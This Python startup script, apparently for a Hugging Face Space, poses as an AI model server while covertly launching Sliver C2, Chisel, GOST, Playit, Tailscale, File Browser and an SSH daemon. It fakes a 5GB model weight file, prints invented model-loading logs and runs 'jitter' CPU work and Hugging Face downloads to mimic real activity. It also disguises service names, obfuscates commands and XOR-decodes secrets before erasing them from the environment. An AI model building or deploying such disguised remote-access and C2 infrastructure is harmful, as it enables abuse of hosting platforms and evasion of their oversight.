import os
import time
import socket
import subprocess
import threading
import random
import string
import sys
from loguru import logger

# Add src/ to sys.path for services and core imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.logging import setup_service_logs
from services import (
    nginx_service,
    tailscale_service,
    playit_service,
    chisel_service,
    minecraft_service,
    filebrowser_service,
    gost_service,
    sliver_service,
)
from services.utils import decode_cmd, deobfuscate_secret

logger.info("--- BOOTING AI MODEL SERVER ---")


def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        # Sleep for a random interval between 45 and 90 minutes
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)

        # CPU Jitter (Matrix math)
        try:
            logger.debug("Processing background inference batch...")
            import numpy as np

            a = np.random.randn(2000, 2000)
            b = np.random.randn(2000, 2000)
            _ = np.dot(a, b)
        except Exception:
            pass

        # Hub Mimic (Network traffic)
        try:
            logger.debug("Syncing model cache...")
            subprocess.run(
                [
                    "curl",
                    "-s",
                    "-o",
                    "/dev/null",
                    "https://huggingface.co/gpt2/resolve/main/vocab.json",
                ]
            )
        except Exception:
            pass


def main():
    logs = setup_service_logs()

    # 2. Prep Filesystem:
    os.makedirs("/home/user/static", exist_ok=True)

    # 2.5 Start nginx on :7860 as smart frontend immediately so HF space binds/resolves port right away:
    nginx_service.start(logs.nginx)

    # 3. Start the Gradio app (app.py) immediately in background on :7861:
    logger.info("Starting Gradio app (API server)...")
    cmd_app = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
    app_proc = subprocess.Popen(cmd_app, shell=True)

    # 4. Runtime Camouflage: Create the fake 5GB model file
    if not os.path.exists("/home/user/pytorch_model.bin"):
        logger.info("Pre-allocating model weight buffer...")
        subprocess.run(["truncate", "-s", "5G", "/home/user/pytorch_model.bin"])

    logger.info("Loading model weights into VRAM...")
    time.sleep(2)

    # Start the background jitter thread
    threading.Thread(target=jitter_task, daemon=True).start()

    delay = random.randint(2, 3)
    logger.info(f"Synchronizing gradient checkpoint topology (standby for {delay}s)...")
    #time.sleep(delay)

    # 5. Start Tailscale (python-cache-manager)
    tailscale_service.start_daemon(logs.ts)

    time.sleep(2)
    logger.info("Warming up text-generation pipelines...")

    # Environment Variable Scrubbing (XOR Obfuscated Single Secrets & Standardized Fallbacks)
    a_env = os.environ.get("A") or os.environ.get("TAILSCALE") or ""
    full_token = deobfuscate_secret(a_env.strip())

    # Erase the secrets from the environment immediately
    keys_to_clean = ["A", "TAILSCALE"]
    for key in keys_to_clean:
        if key in os.environ:
            del os.environ[key]

    # 6. Start File Browser (ai-metrics-collector)
    filebrowser_service.start(logs.fb)

    # 7. Start Playit (tensor-allocator) - XOR bridge starts after SSHD is ready
    playit_service.start(logs.tm)

    # 8. Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
    chisel_service.start(logs.chisel)

    # 8.5 Start GOST (system-bridge) on internal :6790, routed via nginx
    gost_service.start(logs.gost)

    # 8.7 Start Sliver C2 (gradient-optimizer) in headless daemon mode
    sliver_service.start(logs.sliver)

    # 9. Connect to Tailscale (py-cache-cli)
    time.sleep(5)
    tailscale_service.connect(logs.ts, full_token)
    full_token = ""

    # 10. Configure SSH Password
    ssh_pwd_env = os.environ.get("PASS") or os.environ.get("SSH") or ""
    ssh_pwd = deobfuscate_secret(ssh_pwd_env.strip())
    if ssh_pwd:
        logger.info("Setting SSH password from Hugging Face Secrets (PASS)...")
    else:
        ssh_pwd = "".join(random.choices(string.ascii_letters + string.digits, k=16))
        logger.success(f"Generated SSH Password for 'user': {ssh_pwd}")

    try:
        subprocess.run(
            ["sudo", "/usr/sbin/chpasswd"],
            input=f"user:{ssh_pwd}\n",
            text=True,
            check=True,
        )
    except Exception as e:
        logger.error(f"Failed to set password: {e}")
    for key in ["PASS", "SSH"]:
        if key in os.environ:
            del os.environ[key]

    # 11. Start SSHD on port 2222 (set in sshd_config at build time)
    subprocess.Popen(
        "sudo /usr/sbin/sshd -D", shell=True, stdout=logs.ts, stderr=logs.ts
    )

    def wait_for_port(host, port, timeout=30):
        start = time.time()
        while time.time() - start < timeout:
            try:
                with socket.create_connection((host, port), timeout=2):
                    return True
            except OSError:
                time.sleep(0.5)
        return False

    if not wait_for_port("127.0.0.1", 2222, timeout=30):
        logger.error("SSH daemon did not become ready on port 2222")
    else:
        logger.info("SSH daemon ready on port 2222")
        # 11.5 Start XOR bridge NOW that SSHD is confirmed up
        playit_service.start_xor_bridge()

    # 12. Start Minecraft Stealth Daemon in Tmux (server-port 25566; 25565 is XOR bridge)
    # minecraft_service.start()

    logger.success("Model loaded successfully. Background services active.")

    logger.info("Background services are active.")

    app_proc.wait()


if __name__ == "__main__":
    main()
